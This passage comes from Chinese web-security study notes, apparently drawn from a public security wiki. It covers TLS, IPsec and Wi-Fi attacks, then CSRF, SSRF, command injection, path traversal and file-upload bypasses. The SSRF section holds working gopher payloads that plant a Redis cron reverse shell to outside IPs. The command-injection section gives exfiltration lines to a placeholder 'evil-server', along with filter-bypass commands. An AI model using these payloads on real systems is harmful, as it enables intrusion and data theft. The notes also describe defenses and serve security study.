Server Hello 由服务端发送，内容包括：
- 服务端支持的算法类型
- GMT Unix Time
- Random Bytes

### 2.10.3.3. Certificate

- 由服务端或者客户端发送
- 发送方会将自己的数字证书发送给接收方
- 由接收方进行证书验证
- 如果不通过的话，接收方会中断握手的过程
- 一般跟在Client / Server Hello报文之后

### 2.10.3.4. Server Key Exchange

- 由服务端发送
- 将自己的公钥参数传输给了客户端
- 一般也和Server Hello与Certificate在一个TCP报文中

### 2.10.3.5. Server Hello Done

- 服务端发送
- 一般也和Server Hello、Certificate和Server Key Exchange在一个TCP报文中

### 2.10.3.6. Client Key Exchange

- 客户端发送
- 向服务端发送自己的公钥参数
- 与服务端协商密钥

### 2.10.3.7. Change Cipher Spec

- 客户端或者服务端发送
- 紧跟着Key Exchange发送
- 代表自己生成了新的密钥
- 通知对方以后将更换密钥，使用新的密钥进行通信

### 2.10.3.8. Encrypted Handshake Message

- 客户端或者服务端发送
- 紧跟着Key Exchange发送
- 进行测试
- 一方用自己的刚刚生成的密钥加密一段固定的消息发送给对方
- 如果密钥协商正确无误的话，对方可以正确解密

### 2.10.3.9. New Session Ticket

- 服务端发送
- 表示发起会话
- 在一段时间之内(超时时间到来之前)，双方都以刚刚交换的密钥进行通信
- 从这以后，加密通信正式开始

### 2.10.3.10. Application Data

- 使用密钥交换协议协商出来的密钥加密的应用层的数据

### 2.10.3.11. Encrypted Alert

- 客户端或服务端发送
- 意味着加密通信因为某些原因需要中断
- 警告对方不要再发送敏感的数据

---

## 2.10.4. 版本更新内容

### 2.10.4.1. TLS 1.3

TLS 1.3 引入了以下重要更新：

- 引入了PSK作为新的密钥协商机制
- 支持 0-RTT 模式，以安全性降低为代价，在建立连接时节省了往返时间
- ServerHello 之后的所有握手消息采取了加密操作，可见明文减少
- 不再允许对加密报文进行压缩、不再允许双方发起重协商
- DSA 证书不再允许在 TLS 1.3 中使用

#### 删除的不安全密码算法

- **RSA 密钥传输** - 不支持前向安全性
- **CBC 模式密码** - 易受 BEAST 和 Lucky 13 攻击
- **RC4 流密码** - 在 HTTPS 中使用并不安全
- **SHA-1 哈希函数** - 建议以 SHA-2 取而代之
- **任意 Diffie-Hellman 组** - CVE-2016-0701 漏洞
- **输出密码** - 易受 FREAK 和 LogJam 攻击

---

## 2.10.5. 子协议

SSL/TLS协议有一个高度模块化的架构，分为很多子协议，主要是：

- **Handshake 协议**
  - 包括协商安全参数和密码套件
  - 服务端身份认证(客户端身份认证可选)
  - 密钥交换

- **ChangeCipherSpec 协议**
  - 一条消息表明握手协议已经完成

- **Alert 协议**
  - 对握手协议中一些异常的错误提醒
  - 分为fatal和warning两个级别
  - fatal类型的错误会直接中断SSL链接
  - warning级别的错误SSL链接仍可继续，只是会给出错误警告

- **Record 协议**
  - 包括对消息的分段、压缩、消息认证和完整性保护、加密等

---

## 2.10.6. 参考链接

### 2.10.6.1. RFC

| RFC Number | Title |
|------------|-------|
| RFC 2246 | The TLS Protocol Version 1.0 |
| RFC 4346 | The Transport Layer Security (TLS) Protocol Version 1.1 |
| RFC 5246 | The Transport Layer Security (TLS) Protocol Version 1.2 |
| RFC 6101 | The Secure Sockets Layer (SSL) Protocol Version 3.0 |
| RFC 6176 | Prohibiting Secure Sockets Layer (SSL) Version 2.0 |
| RFC 7568 | Deprecating Secure Sockets Layer Version 3.0 |
| RFC 8446 | The Transport Layer Security (TLS) Protocol Version 1.3 |

### 2.10.6.2. Document

- Wikipedia Transport Layer Security

---

## [IPsec协议](https://websec.readthedocs.io/zh/latest/network/ipsec.html)

# 2.11. IPsec

## 2.11.1. 简介

IPsec（IP Security）是IETF制定的三层隧道加密协议，它为Internet上传输的数据提供了高质量的、可互操作的、基于密码学的安全保证。特定的通信方之间在IP层通过加密与数据源认证等方式，提供了以下的安全服务：

* **数据机密性（Confidentiality）**
  * IPsec发送方在通过网络传输包前对包进行加密。
* **数据完整性（Data Integrity）**
  * IPsec接收方对发送方发送来的包进行认证，以确保数据在传输过程中没有被篡改。
* **数据来源认证（Data Authentication）**
  * IPsec在接收端可以认证发送IPsec报文的发送端是否合法。
* **防重放（Anti-Replay）**
  * IPsec接收方可检测并拒绝接收过时或重复的报文。

---

## 2.11.2. 优点

IPsec具有以下优点：

* 支持IKE（Internet Key Exchange，因特网密钥交换），可实现密钥的自动协商功能，减少了密钥协商的开销。可以通过IKE建立和维护SA的服务，简化了IPsec的使用和管理。
* 所有使用IP协议进行数据传输的应用系统和服务都可以使用IPsec，而不必对这些应用系统和服务本身做任何修改。
* 对数据的加密是以数据包为单位的，而不是以整个数据流为单位，这不仅灵活而且有助于进一步提高IP数据包的安全性，可以有效防范网络攻击。

---

## 2.11.3. 构成

IPsec由四部分内容构成：

* 负责密钥管理的**Internet密钥交换协议IKE**（Internet Key Exchange Protocol）
* 负责将安全服务与使用该服务的通信流相联系的**安全关联SA**（Security Associations）
* 直接操作数据包的**认证头协议AH**（IP Authentication Header）和**安全载荷协议ESP**（IP Encapsulating Security Payload）
* 若干用于加密和认证的算法

---

## 2.11.4. 安全联盟（Security Association，SA）

IPsec在两个端点之间提供安全通信，端点被称为**IPsec对等体**。

**SA是IPsec的基础，也是IPsec的本质。** SA是通信对等体间对某些要素的约定，例如：

* 使用哪种协议（AH、ESP还是两者结合使用）
* 协议的封装模式（传输模式和隧道模式）
* 加密算法（DES、3DES和AES）
* 特定流中保护数据的共享密钥
* 密钥的生存周期等

建立SA的方式有**手工配置**和**IKE自动协商**两种。

### SA的特性

* SA是**单向的**，在两个对等体之间的双向通信，最少需要两个SA来分别对两个方向的数据流进行安全保护。
* 同时，如果两个对等体希望同时使用AH和ESP来进行安全通信，则每个对等体都会针对每一种协议来构建一个独立的SA。

### SA的标识

SA由一个**三元组**来唯一标识：

| 组成部分 | 说明 |
|---------|------|
| **SPI**（Security Parameter Index，安全参数索引） | 用于唯一标识SA的一个32比特数值，在AH和ESP头中传输 |
| **目的IP地址** | 通信对等体的IP地址 |
| **安全协议号** | AH或ESP协议标识 |

### SPI说明

* 在**手工配置SA**时，需要手工指定SPI的取值
* 使用**IKE协商产生SA**时，SPI将随机生成

---

## 2.11.5. IKE

IKE（RFC2407，RFC2408、RFC2409）属于一种**混合型协议**，由以下组件组成：

* Internet安全关联和密钥管理协议（ISAKMP）
* 两种密钥交换协议：OAKLEY与SKEME

IKE创建在由ISAKMP定义的框架上，沿用了OAKLEY的密钥交换模式以及SKEME的共享和密钥更新技术，还定义了它自己的两种密钥交换方式。

### IKE的两个阶段

IKE使用了**两个阶段的ISAKMP**：

| 阶段 | 描述 |
|------|------|
| **第一阶段** | 协商创建一个通信信道（IKE SA），并对该信道进行验证，为双方进一步的IKE通信提供**机密性、消息完整性以及消息源验证**服务 |
| **第二阶段** | 使用已建立的IKE SA建立IPsec SA（V2中叫Child SA） |

---

## [Wi-Fi安全](https://websec.readthedocs.io/zh/latest/network/wifi.html)

# 2.12. Wi-Fi安全

## 简介

Wi-Fi，又称"无线热点"或"无线网络"，是Wi-Fi联盟的商标，是一种基于IEEE 802.11标准的无线局域网技术。

## 攻击方法

### 1. 暴力破解攻击

Wi-Fi密码基于预共享密钥，可以通过抓取数据包后在本地快速进行批量暴力破解。

### 2. 恶意热点攻击

接入点(AP)可以动态广播自己，客户端也可以主动发送探测请求。攻击者可以伪造AP发送探测响应包，导致客户端错误地识别假冒网络。

### 3. 密钥重装攻击（KRACK）

由Vanhoef发现，该漏洞利用Wi-Fi握手过程中的密钥更新机制。攻击原理是重放握手消息，导致客户端重新安装相同的密钥。

### 4. Dragonblood

最新的WPA3标准实现存在一些问题，同样由Vanhoef发现。漏洞包括：

- 拒绝服务（DoS）攻击
- 降级攻击
- 侧信道信息泄露

## 参考链接

| 资源 | 描述 |
|----------|-------------|
| [Wi-Fi Alliance](https://www.wi-fi.org/) | 官方Wi-Fi标准组织 |
| [Dragonblood论文](https://papers.mathyvanhoef.com/dragonblood.pdf) | WPA3和EAP-pwd Dragonfly握手分析 |
| [快速被动Wi-Fi扫描](https://papers.mathyvanhoef.com/nordsec2019.pdf) | 通过被动扫描改善隐私 |
| [WPA-TKIP侧信道攻击](https://papers.mathyvanhoef.com/asiaccs2019.pdf) | 针对WPA-TKIP的实际侧信道攻击 |
| [KRACK攻击论文](https://papers.mathyvanhoef.com/blackhat-eu2017.pdf) | 破解WPA2协议 |
| [RFC 7664](https://tools.ietf.org/html/rfc7664) | Dragonfly密钥交换规范 |

---

*文档来源：Web安全文档 (websec.readthedocs.io)*

---

# Web安全学习笔记 - 常见漏洞攻防

## [4.1. SQL注入 (SQL Injection)](https://websec.readthedocs.io/zh/latest/vuln/sql/index.html)

### 4.1.1. 注入分类

- 4.1.1.1. 简介
- 4.1.1.2. 按技巧分类
- 4.1.1.3. 按获取数据的方式分类

### 4.1.2. 注入检测

- 4.1.2.1. 常见的注入点
- 4.1.2.2. Fuzz注入点
- 4.1.2.3. 测试用常量
- 4.1.2.4. 测试列数
- 4.1.2.5. 报错注入
- 4.1.2.6. 堆叠注入
- 4.1.2.7. 注释符
- 4.1.2.8. 判断过滤规则
- 4.1.2.9. 获取信息
- 4.1.2.10. 测试权限

### 4.1.3. 权限提升

- 4.1.3.1. UDF提权

### 4.1.4. 数据库检测

- 4.1.4.1. MySQL
- 4.1.4.2. Oracle
- 4.1.4.3. SQLServer
- 4.1.4.4. PostgreSQL

### 4.1.5. 绕过技巧

### 4.1.6. SQL注入小技巧

- 4.1.6.1. 宽字节注入
- 4.1.6.2. 二次注入

### 4.1.7. CheatSheet (Payload Reference)

| Database Type | Section |
|----------------|---------|
| SQL Server Payload | 4.1.7.1 |
| MySQL Payload | 4.1.7.2 |
| PostgreSQL Payload | 4.1.7.3 |
| Oracle Payload | 4.1.7.4 |
| SQLite3 Payload | 4.1.7.5 |
| NoSQL Payload | 4.1.7.6 |

### 4.1.8. 预编译

- 4.1.8.1. 简介
- 4.1.8.2. 模拟预编译
- 4.1.8.3. 绕过

### 4.1.9. 参考文章

- 4.1.9.1. Tricks
- 4.1.9.2. Bypass
- 4.1.9.3. NoSQL
- 4.1.9.4. Cheatsheet

---

## [4.2. XSS (跨站脚本攻击)](https://websec.readthedocs.io/zh/latest/vuln/xss/index.html)

### 4.2.1. 分类

- 4.2.1.1. 简介
- 4.2.1.2. 反射型XSS
- 4.2.1.3. 储存型XSS
- 4.2.1.4. DOM XSS
- 4.2.1.5. Blind XSS

### 4.2.2. 危害

### 4.2.3. 同源策略

- 4.2.3.1. 简介
- 4.2.3.2. 源的更改
- 4.2.3.3. 跨源访问
- 4.2.3.4. CORS
- 4.2.3.5. 阻止跨源访问

### 4.2.4. CSP (Content Security Policy)

- 4.2.4.1. 什么是CSP
- 4.2.4.2. 配置
- 4.2.4.3. 绕过技巧

### 4.2.5. XSS数据源

- 4.2.5.1. URL
- 4.2.5.2. Navigation
- 4.2.5.3. Communication
- 4.2.5.4. Storage

### 4.2.6. Sink

- 4.2.6.1. Execute JavaScript
- 4.2.6.2. Load URL
- 4.2.6.3. Execute HTML

### 4.2.7. XSS保护

- 4.2.7.1. HTML Filtering
- 4.2.7.2. X-Frame
- 4.2.7.3. XSS Protection Header

### 4.2.8. WAF Bypass

### 4.2.9. 技巧

- 4.2.9.1. HttpOnly
- 4.2.9.2. CSS Injection
- 4.2.9.3. Bypass Via Script Gadgets
- 4.2.9.4. RPO (Relative Path Overwrite)

### 4.2.10. Payloads

- 4.2.10.1. 通用Payload
- 4.2.10.2. 大小写绕过
- 4.2.10.3. 各种alert方法
- 4.2.10.4. 伪协议
- 4.2.10.5. Chrome XSS Auditor Bypass
- 4.2.10.6. 长度限制
- 4.2.10.7. jQuery sourceMappingURL
- 4.2.10.8. Image Filenames
- 4.2.10.9. 过期Payload
- 4.2.10.10. CSS
- 4.2.10.11. Markdown
- 4.2.10.12. iframe
- 4.2.10.13. form
- 4.2.10.14. meta

### 4.2.11. 持久化

- 4.2.11.1. Storage-based
- 4.2.11.2. Service Worker
- 4.2.11.3. AppCache

### 4.2.12. 参考链接

---

## [4.3. CSRF (跨站请求伪造)](https://websec.readthedocs.io/zh/latest/vuln/csrf.html)

### 4.3.1. 简介

跨站请求伪造 (Cross-Site Request Forgery, CSRF)，也被称为 One Click Attack 或者 Session Riding ，通常缩写为CSRF，是一种对网站的恶意利用。尽管听起来像XSS，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。

### 4.3.2. 分类

#### 4.3.2.1. 资源包含

资源包含是在大多数介绍CSRF概念的演示或基础课程中可能看到的类型。这种类型归结为控制HTML标签（例如`<image>`、`<audio>`、`<video>`、`<object>`、`<script>`等）所包含的资源的攻击者。如果攻击者能够影响URL被加载的话，包含远程资源的任何标签都可以完成攻击。

由于缺少对Cookie的源点检查，如上所述，此攻击不需要XSS，可以由任何攻击者控制的站点或站点本身执行。此类型仅限于GET请求，因为这些是浏览器对资源URL唯一的请求类型。这种类型的主要限制是它需要错误地使用安全的HTTP请求方式。

#### 4.3.2.2. 基于表单

通常在正确使用安全的请求方式时看到。攻击者创建一个想要受害者提交的表单; 其包含一个JavaScript片段，强制受害者的浏览器提交。

该表单可以完全由隐藏的元素组成，以致受害者很难发现它。

如果处理cookies不当，攻击者可以在任何站点上发动攻击，只要受害者使用有效的cookie登录，攻击就会成功。如果请求是有目的性的，成功的攻击将使受害者回到他们平时正常的页面。该方法对于攻击者可以将受害者指向特定页面的网络钓鱼攻击特别有效。

#### 4.3.2.3. XMLHttpRequest

XMLHttpRequest可能是最少看到的方式，由于许多现代Web应用程序依赖XHR，许多应用花费大量的时间来构建和实现这一特定的对策。

基于XHR的CSRF通常由于SOP而以XSS有效载荷的形式出现。没有跨域资源共享策略 (Cross-Origin Resource Sharing, CORS)，XHR仅限于攻击者托管自己的有效载荷的原始请求。

这种类型的CSRF的攻击有效载荷基本上是一个标准的XHR，攻击者已经找到了一些注入受害者浏览器DOM的方式。

### 4.3.3. 防御

- 通过CSRF-token或者验证码来检测用户提交
- 验证 Referer/Content-Type
- 对于用户修改删除等操作最好都使用POST操作
- 避免全站通用的Cookie，严格设置Cookie的域

### 4.3.4. 参考链接

- [demo](https://www.github.com/jrozner/csrf-demo)
- [Wiping Out CSRF](https://medium.com/@jrozner/wiping-out-csrf-ded97ae7e83f)
- [Neat tricks to bypass CSRF protection](https://www.slideshare.net/0ang3el/neat-tricks-to-bypass-csrfprotection)

---

## [4.4. SSRF (服务端请求伪造)](https://websec.readthedocs.io/zh/latest/vuln/ssrf.html)

### 4.4.1. 简介

服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。

#### 4.4.1.1. 漏洞危害

SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。

内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。

### 4.4.2. 利用方式

SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。

以curl为例, 可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下：

```
curl -vvv 'dict://127.0.0.1:6379/info'

curl -vvv 'file:///etc/passwd'

# * 注意: 链接使用单引号，避免$变量问题

curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/6789 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'
```

### 4.4.3. 相关危险函数

SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以PHP为例，涉及到的函数有 `file_get_contents()` / `fsockopen()` / `curl_exec()` 等。

### 4.4.4. 过滤绕过

#### 4.4.4.1. 更改IP地址写法

一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式：

- `^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$`
- `^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$`
- `^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$`

对于这种过滤我们采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成：

- 8进制格式：0300.0250.0.1
- 16进制格式：0xC0.0xA8.0.1
- 10进制整数格式：3232235521
- 16进制整数格式：0xC0A80001
- 合并后两位：1.1.278 / 1.1.755
- 合并后三位：1.278 / 1.755 / 3.14159267

另外IP中的每一位，各个进制可以混用。

访问改写后的IP地址时，Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作。

另外，0.0.0.0这个IP可以直接访问到本地，也通常被正则过滤遗漏。

#### 4.4.4.2. 使用解析到内网的域名

如果服务端没有先解析IP再过滤内网地址，我们就可以使用localhost等解析到内网的域名。

另外 `xip.io` 提供了一个方便的服务，这个网站的子域名会解析到对应的IP，例如192.168.0.1.xip.io，解析到192.168.0.1。

#### 4.4.4.3. 利用解析URL所出现的问题

在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。

比如 `http://www.baidu.com@192.168.0.1/` 当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是www.baidu.com，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为www.baidu.com，而实际上这个URL所请求的内容都是192.168.0.1上的内容。

#### 4.4.4.4. 利用跳转

如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。

可以使用如 http://httpbin.org/redirect-to?url=http://192.168.0.1 等服务跳转，但是由于URL中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。

常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会。

#### 4.4.4.5. 通过各种非HTTP协议

如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。

比如通过gopher，可以在一个url参数中构造POST或者GET请求，从而达到攻击内网应用的目的。例如可以使用gopher协议对与内网的Redis服务进行攻击，可以使用如下的URL：

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i >& /dev/tcp/172.19.23.228/23330>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```

除了gopher协议，File协议也是SSRF中常用的协议，该协议主要用于访问本地计算机中的文件，我们可以通过类似 `file:///path/to/file` 这种格式来访问计算机本地文件。使用file协议可以避免服务端程序对于所访问的IP进行的过滤。例如我们可以通过 `file:///d:/1.txt` 来访问D盘中1.txt的内容。

#### 4.4.4.6. DNS Rebinding

一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。

但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。

要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：

- 服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP
- 对于获得的IP进行判断，发现为非黑名单IP，则通过验证
- 服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。
- 由于已经绕过验证，所以服务器端返回访问内网资源的结果。

#### 4.4.4.7. 利用IPv6

有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 `[::]` `0000::1` 或IPv6的内网域名来绕过过滤。

#### 4.4.4.8. 利用IDN

一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。

在这些字符中，部分字符会在访问时做一个等价转换，例如 `ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ` 和 `example.com` 等同。利用这种方式，可以用 `① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩` 等字符绕过内网限制。

### 4.4.5. 可能的利用点

#### 4.4.5.1. 内网服务

- Apache Hadoop远程命令执行
- axis2-admin部署Server命令执行
- Confluence SSRF
- counchdb WEB API远程命令执行
- dict
- docker API远程命令执行
- Elasticsearch引擎Groovy脚本命令执行
- ftp / ftps（FTP爆破）
- glassfish任意文件读取和war文件部署间接命令执行
- gopher
- HFS远程命令执行
- http、https
- imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）
- Java调试接口命令执行
- JBOSS远程Invoker war命令执行
- Jenkins Scripts接口命令执行
- ldap
- mongodb
- php\_fpm/fastcgi 命令执行
- rtsp - smb/smbs（连接SMB）
- sftp
- ShellShock 命令执行
- Struts2 命令执行
- telnet
- tftp（UDP协议扩展）
- tomcat命令执行
- WebDav PUT上传任意文件
- WebSphere Admin可部署war间接命令执行
- zentoPMS远程命令执行

#### 4.4.5.2. Redis利用

- 写ssh公钥
- 写crontab
- 写WebShell
- Windows写启动项
- 主从复制加载 .so 文件
- 主从复制写无损文件

#### 4.4.5.3. 云主机

在AWS、Google等云环境下，通过访问云环境的元数据API或管理API，在部分情况下可以实现敏感信息等效果。

### 4.4.6. 防御方式

- 过滤返回的信息
- 统一错误信息
- 限制请求的端口
- 禁止不常用的协议
- 对DNS Rebinding，考虑使用DNS缓存或者Host白名单

---

## [4.5. 命令注入](https://websec.readthedocs.io/zh/latest/vuln/cmdinjection.html)

### 4.5.1. 简介

命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞。

该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些Web管理界面的配置主机名/IP/掩码/网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。

### 4.5.2. 常见危险函数

#### 4.5.2.1. PHP

- system
- exec
- passthru
- shell_exec
- popen
- proc_open

#### 4.5.2.2. Python

- system
- popen
- subprocess.call
- spawn

#### 4.5.2.3. Java

- java.lang.Runtime.getRuntime().exec(command)

### 4.5.3. 常见注入方式

- 分号分割
- `||` `&&` `&` 分割
- `|` 管道符
- `\r\n` `%d0%a0` 换行
- 反引号解析
- `$()` 替换

### 4.5.4. 无回显技巧

- bash反弹shell
- DNS带外数据
- http带外
  - `curl http://evil-server/$(whoami)`
  - `wget http://evil-server/$(whoami)`
- 无带外时利用 `sleep` 或其他逻辑构造布尔条件

### 4.5.5. 常见绕过方式

#### 4.5.5.1. 空格绕过

- `<` 符号 `cat<123`
- `\t` / `%09`
- `${IFS}` 其中{}用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串

#### 4.5.5.2. 黑名单绕过

- `a=l;b=s;$a$b`
- base64 `echo "bHM=" | base64 -d`
- `/?in/?s` => `/bin/ls`
- 连接符 `cat /etc/pass'w'd`
- 未定义的初始化变量 `cat$x /etc/passwd`

#### 4.5.5.3. 长度限制绕过

```
>wget\
>foo.\
>com
ls -t>a
sh a
```

上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行。直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令。这里可以使用一些诸如w,\[之类的短命令，(使用ls /usr/bin/?查看)。如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向。而在php中，使用 shell_exec 等执行系统命令的函数的时候，是不存在标准输入流的，所以可以直接创建文件。

### 4.5.6. 常用符号

#### 4.5.6.1. 命令分隔符

- `%0a` / `%0d` / `\n` / `\r`
- `;`
- `&` / `&&`

#### 4.5.6.2. 通配符

- `*` 0到无穷个任意字符
- `?` 一个任意字符
- `[ ]` 一个在括号内的字符，e.g. `[abcd]`
- `[ - ]` 在编码顺序内的所有字符
- `[^ ]` 一个不在括号内的字符

### 4.5.7. 防御

- 不使用时禁用相应函数
- 尽量不要执行外部的应用程序或命令
- 做输入的格式检查
- 转义命令中的所有shell元字符

> shell元字符包括 `#&;`,|`*?~<>^()[]{}$`

---

## [4.6. 目录穿越](https://websec.readthedocs.io/zh/latest/vuln/pathtraversal.html)

### 4.6.1. 简介

目录穿越（也被称为目录遍历/directory traversal/path traversal）是通过使用 `../` 等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。

### 4.6.2. 攻击载荷

#### 4.6.2.1. URL参数

- `../`
- `..\`
- `..;/`

#### 4.6.2.2. Nginx Off by Slash

- `https://vuln.site.com/files../`

#### 4.6.2.3. UNC Bypass

- `\\localhost\c$\windows\win.ini`

### 4.6.3. 过滤绕过

- **单次替换**
  - `...//`
- **URL编码**
- **16位Unicode编码**
  - `\u002e`
- **超长UTF-8编码**
  - `\%e0%40%ae`

### 4.6.4. 防御

在进行文件操作相关的API前，应该对用户输入做过滤。较强的规则下可以使用白名单，仅允许纯字母或数字字符等。

若规则允许的字符较多，最好使用当前操作系统路径规范化函数规范化路径后，进行过滤，最后再进行相关调用。

### 4.6.5. 参考链接

- [Directory traversal by portswigger](https://portswigger.net/web-security/file-path-traversal)
- [Path Traversal by OWASP](https://www.owasp.org/index.php/Path%5FTraversal)
- [path normalization](https://blogs.msdn.microsoft.com/jeremykuhne/2016/04/21/path-normalization/)
- [Breaking Parser Logic: Take Your Path Normalization Off and Pop 0days Out defcon](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)

---

## [4.7. 文件读取](https://websec.readthedocs.io/zh/latest/vuln/fileread.html)

考虑读取可能有敏感信息的文件

**用户目录下的敏感文件**

- `.bash_history`
- `.zsh_history`
- `.profile`
- `.bashrc`
- `.gitconfig`
- `.viminfo`
- `passwd`

**应用的配置文件**

- `/etc/apache2/apache2.conf`
- `/etc/nginx/nginx.conf`

**应用的日志文件**

- `/var/log/apache2/access.log`
- `/var/log/nginx/access.log`

**站点目录下的敏感文件**

- `.svn/entries`
- `.git/HEAD`
- `WEB-INF/web.xml`
- `.htaccess`

**特殊的备份文件**

- `.swp`
- `.swo`
- `.bak`
- `index.php~`
- ...

**Python的Cache**

- `__pycache__/__init__.cpython-35.pyc`

---

## [4.8. 文件上传](https://websec.readthedocs.io/zh/latest/vuln/fileupload.html)

### 4.8.1. 文件类型检测绕过

#### 4.8.1.1. 更改请求绕过

有的站点仅仅在前端检测了文件类型，这种类型的检测可以直接修改网络请求绕过。同样的，有的站点在后端仅检查了HTTP Header中的信息，比如 `Content-Type` 等，这种检查同样可以通过修改网络请求绕过。

#### 4.8.1.2. Magic检测绕过

有的站点使用文件头来检测文件类型，这种检查可以在Shell前加入对应的字节以绕过检查。几种常见的文件类型的头字节如下表所示：

| 类型  | 二进制值                          |
| --- | ----------------------------- |
| JPG | FF D8 FF E0 00 10 4A 46 49 46 |
| GIF | 47 49 46 38 39 61             |
| PNG | 89 50 4E 47                   |
| TIF | 49 49 2A 00                   |
| BMP | 42 4D                         |

#### 4.8.1.3. 后缀绕过

部分服务仅根据后缀、上传时的信息或Magic Header来判断文件类型，此时可以绕过。

php由于历史原因，部分解释器可能支持符合正则 `/ph(p[2-7]?|t(ml)?)/` 的后缀，如 `php` / `php5` / `pht` / `phtml` / `shtml` / `pwml` / `phtm` 等，可在禁止上传php文件时测试该类型。

jsp引擎则可能会解析 `jspx` / `jspf` / `jspa` / `jsw` / `jsv` / `jtml` 等后缀，asp支持 `asa` / `asax` / `cer` / `cdx` / `aspx` / `ascx` / `ashx` / `asmx` / `asp{80-90}` 等后缀。

除了这些绕过，其他的后缀同样可能带来问题，如 `vbs` / `asis` / `sh` / `reg` / `cgi` / `exe` / `dll` / `com` / `bat` / `pl` / `cfc` / `cfm` / `ini` 等。

#### 4.8.1.4. 系统命名绕过

在Windows系统中，上传 `index.php.` 会重命名为 `.` ，可以绕过后缀检查。也可尝试 `index.php%20` ， `index.php:1.jpg` `index.php::$DATA` 等。在Linux系统中，可以尝试上传名为 `index.php/.` 或 `./aa/../index.php/.` 的文件。

#### 4.8.1.5. .user.ini

